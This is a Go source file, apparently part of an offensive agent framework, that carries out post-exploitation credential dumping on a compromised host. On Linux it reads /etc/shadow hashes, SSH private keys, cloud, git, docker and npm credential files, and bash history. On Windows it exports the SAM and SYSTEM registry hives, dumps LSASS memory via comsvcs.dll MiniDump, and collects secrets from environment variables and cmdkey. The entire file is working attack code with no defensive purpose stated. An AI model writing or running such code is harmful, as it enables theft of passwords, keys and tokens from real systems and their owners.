// agents/cell/post/credentials.go
// Post-exploitation credential dump — real extraction for Windows/Linux.

package post

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

type Credential struct {
	Username string
	Type     string // "hash", "password", "key", "ticket", "token"
	Value    string
	Scope    string // "local", "domain", "env"
	Source   string // "sam", "lsass", "shadow", "history", "keyring", "dpapi"
}

type CredDumpResult struct {
	Success bool
	Creds   []Credential
	Error   string
}

// DumpCredentials extracts credentials from the compromised system.
func DumpCredentials() CredDumpResult {
	if runtime.GOOS == "windows" {
		return dumpWindowsCredentials()
	}
	return dumpLinuxCredentials()
}

// ─── Linux ──────────────────────────────────────────────────────

func dumpLinuxCredentials() CredDumpResult {
	res := CredDumpResult{Success: false, Creds: []Credential{}}

	// 1. /etc/shadow (requires root)
	if data, err := os.ReadFile("/etc/shadow"); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			parts := strings.Split(line, ":")
			if len(parts) > 1 && len(parts[1]) > 10 {
				res.Creds = append(res.Creds, Credential{
					Username: parts[0], Type: "hash", Value: parts[1],
					Scope: "local", Source: "shadow",
				})
				res.Success = true
			}
		}
	}

	// 2. SSH private keys
	sshDirs := []string{"/root/.ssh", os.ExpandEnv("$HOME/.ssh")}
	for _, dir := range sshDirs {
		for _, keyfile := range []string{"id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"} {
			path := dir + "/" + keyfile
			if data, err := os.ReadFile(path); err == nil {
				res.Creds = append(res.Creds, Credential{
					Username: keyfile, Type: "key", Value: string(data),
					Scope: "local", Source: "ssh",
				})
				res.Success = true
			}
		}
	}

	// 3. Config files with credentials
	credFiles := []string{
		os.ExpandEnv("$HOME/.git-credentials"),
		os.ExpandEnv("$HOME/.docker/config.json"),
		os.ExpandEnv("$HOME/.aws/credentials"),
		os.ExpandEnv("$HOME/.config/gcloud/credentials.db"),
		os.ExpandEnv("$HOME/.npmrc"),
		"/etc/passwd",
	}
	for _, path := range credFiles {
		if data, err := os.ReadFile(path); err == nil && len(data) > 0 && len(data) < 65536 {
			content := string(data)
			keywords := []string{"password", "secret", "token", "api_key", "access_key", "private_key", "passwd"}
			for _, kw := range keywords {
				if strings.Contains(strings.ToLower(content), kw) {
					res.Creds = append(res.Creds, Credential{
						Username: path, Type: "password", Value: content[:256],
						Scope: "local", Source: "config_file",
					})
					res.Success = true
					break
				}
			}
		}
	}

	// 4. Bash history SSH passwords
	if data, err := os.ReadFile(os.ExpandEnv("$HOME/.bash_history")); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			lower := strings.ToLower(line)
			if strings.Contains(lower, "ssh ") && strings.Contains(lower, "@") {
				if strings.Contains(line, " -p") || strings.Contains(line, "-i ") ||
					strings.Contains(lower, "password") || strings.Contains(line, "pass=") {
					res.Creds = append(res.Creds, Credential{
						Username: "ssh_history_hint", Type: "password_candidate",
						Value: line, Scope: "local", Source: "bash_history",
					})
					res.Success = true
				}
			}
		}
	}

	return res
}

// ─── Windows ────────────────────────────────────────────────────

func dumpWindowsCredentials() CredDumpResult {
	res := CredDumpResult{Success: false, Creds: []Credential{}}

	// 1. SAM export via reg save
	if err := dumpSAMRegistry(&res); err != nil {
		res.Error = err.Error()
	}

	// 2. LSASS dump via powershell (mini-dump)
	if out, err := exec.Command("powershell", "-c",
		"Get-Process lsass | Select-Object Id -ExpandProperty Id",
	).CombinedOutput(); err == nil && len(out) > 0 {
		lsassPid := strings.TrimSpace(string(out))
		if lsassPid != "" {
			dumpPath := os.TempDir() + string(os.PathSeparator) + "argos_lsass.dmp"
			cmd := exec.Command("powershell", "-c",
				fmt.Sprintf("rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump %s %s full",
					lsassPid, dumpPath),
			)
			if err := cmd.Run(); err == nil {
				res.Creds = append(res.Creds, Credential{
					Username: "LSASS_DUMP", Type: "dump_file",
					Value: dumpPath, Scope: "domain", Source: "lsass",
				})
				res.Success = true
			}
		}
	}

	// 3. LSASS in-memory via direct syscalls (see exploit/syscalls_windows.go)
	// For now: extract from environment variables
	if out, err := exec.Command("cmd.exe", "/c", "set").CombinedOutput(); err == nil {
		for _, line := range strings.Split(string(out), "\n") {
			lower := strings.ToLower(line)
			if strings.Contains(lower, "password") || strings.Contains(lower, "pass=") ||
				strings.Contains(lower, "secret") || strings.Contains(lower, "token") {
				parts := strings.SplitN(line, "=", 2)
				if len(parts) == 2 {
					res.Creds = append(res.Creds, Credential{
						Username: parts[0], Type: "password",
						Value: strings.TrimSpace(parts[1]), Scope: "env", Source: "env_vars",
					})
					res.Success = true
				}
			}
		}
	}

	// 4. Cached credentials (cmdkey /list)
	if out, err := exec.Command("cmdkey", "/list").CombinedOutput(); err == nil {
		content := string(out)
		for _, line := range strings.Split(content, "\n") {
			if strings.Contains(line, "Target:") || strings.Contains(line, "User:") {
				res.Creds = append(res.Creds, Credential{
					Username: strings.TrimSpace(line), Type: "cached_cred",
					Scope: "local", Source: "cmdkey",
				})
				res.Success = true
			}
		}
	}

	return res
}

func dumpSAMRegistry(res *CredDumpResult) error {
	samPath := os.TempDir() + string(os.PathSeparator) + "argos_sam.save"
	sysPath := os.TempDir() + string(os.PathSeparator) + "argos_system.save"

	cmds := []*exec.Cmd{
		exec.Command("cmd.exe", "/c", fmt.Sprintf("reg save HKLM\\sam %s /y", samPath)),
		exec.Command("cmd.exe", "/c", fmt.Sprintf("reg save HKLM\\system %s /y", sysPath)),
	}

	for _, cmd := range cmds {
		if err := cmd.Run(); err != nil {
			return fmt.Errorf("reg save failed: %v", err)
		}
	}

	res.Creds = append(res.Creds, Credential{
		Username: "SAM_EXPORT", Type: "registry_hive",
		Value: fmt.Sprintf("sam=%s system=%s", samPath, sysPath),
		Scope: "local", Source: "sam",
	})
	res.Success = true

	// Note: Files are NOT deleted here — caller should extract hashes first,
	// then clean up via Cleanup() to avoid losing the hives before use.
	return nil
}
